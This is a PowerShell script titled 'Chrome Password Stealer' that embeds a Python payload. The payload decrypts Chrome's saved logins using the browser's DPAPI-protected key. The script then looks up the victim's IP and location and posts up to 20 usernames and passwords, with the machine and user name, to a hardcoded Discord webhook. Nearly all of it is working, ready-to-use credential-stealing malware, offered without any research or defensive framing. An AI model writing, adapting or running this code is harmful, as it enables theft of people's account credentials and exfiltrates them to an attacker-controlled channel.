# Chrome Password Stealer - Clean Version

Write-Host "=== Chrome Password Extractor dihh ===" -ForegroundColor Cyan
Write-Host ""

# Create Python script (NO debug output)
$pythonScript = @'
import sys, json, base64, sqlite3, shutil, os
from Crypto.Cipher import AES
import win32crypt

try:
    # Get encryption key
    local_state = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state, "r", encoding="utf-8") as f:
        state = json.loads(f.read())
    
    encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    
    # Copy database
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    temp_db = os.path.join(os.environ["TEMP"], "chrome_{}.db".format(os.getpid()))
    shutil.copyfile(db_path, temp_db)
    
    # Extract passwords
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    results = []
    for url, username, enc_pass in cursor.fetchall():
        if not enc_pass:
            continue
        
        try:
            # Detect encryption version
            if enc_pass[:3] in (b'v10', b'v11', b'v20'):
                # AES-GCM
                nonce = enc_pass[3:15]
                ciphertext = enc_pass[15:-16]
                tag = enc_pass[-16:]
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                try:
                    password = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
                except:
                    password = cipher.decrypt(ciphertext).decode('utf-8', errors='ignore')
            else:
                # DPAPI
                password = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1].decode('utf-8', errors='ignore')
            
            results.append({"url": url, "username": username, "password": password})
        except:
            pass
    
    cursor.close()
    conn.close()
    os.remove(temp_db)
    
    print(json.dumps(results))
except Exception as e:
    print(json.dumps({"error": str(e)}))
'@

$scriptPath = "$env:TEMP\extract.py"
$pythonScript | Out-File $scriptPath -Encoding UTF8

Write-Host "Installing dependencies..." -ForegroundColor Yellow
python -m pip install pycryptodome pywin32 --quiet --disable-pip-version-check 2>&1 | Out-Null

Write-Host "Extracting passwords..." -ForegroundColor Yellow
$output = python $scriptPath 2>&1 | Out-String
Write-Host "Raw output:" -ForegroundColor Yellow
Write-Host $output
Write-Host "---" -ForegroundColor Yellow

# Parse JSON
try {
    $passwords = $output | ConvertFrom-Json
    
    if ($passwords.error) {
        Write-Host "Error: $($passwords.error)" -ForegroundColor Red
        Read-Host "Press Enter"
        exit
    }
    
    Write-Host "Found $($passwords.Count) passwords!" -ForegroundColor Green
    
    # Get system info
    $user = $env:USERNAME
    $computer = $env:COMPUTERNAME
    $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    try {
        $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"
        $ip = $ipInfo.query
        $city = $ipInfo.city
        $country = $ipInfo.country
    } catch {
        $ip = "Unknown"
        $city = "Unknown"
        $country = "Unknown"
    }
    
    # Format for Discord (max 20)
    $passText = ""
    $max = [Math]::Min($passwords.Count, 20)
    for ($i = 0; $i -lt $max; $i++) {
        $p = $passwords[$i]
        $passText += "`n**$($p.url)**`nUser: ``$($p.username)```nPass: ``$($p.password)```n"
    }
    
    if ($passwords.Count -gt 20) {
        $passText += "`n... +$($passwords.Count - 20) more"
    }
    
    $message = @"
**🚨 New Connection**
:clock1: $time
:computer: $computer | $user
:globe_with_meridians: $ip - $city, $country

**🔐 Passwords ($($passwords.Count)):**$passText
"@
    
    # Send to Discord
    Write-Host "Sending to Discord..." -ForegroundColor Yellow
    $webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"
    
    if ($message.Length -gt 1900) {
        $message = $message.Substring(0, 1900)
    }
    
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message}|ConvertTo-Json) -ContentType "application/json"
    Write-Host "Sent!" -ForegroundColor Green
    
    # Save locally
    $outFile = "$env:USERPROFILE\Desktop\passwords.txt"
    $passwords | ConvertTo-Json | Out-File $outFile
    Write-Host "Saved to: $outFile" -ForegroundColor Cyan
    
} catch {
    Write-Host "Parse error: $($_.Exception.Message)" -ForegroundColor Red
}

#Remove-Item $scriptPath -ErrorAction SilentlyContinue
Read-Host "Press Enter"
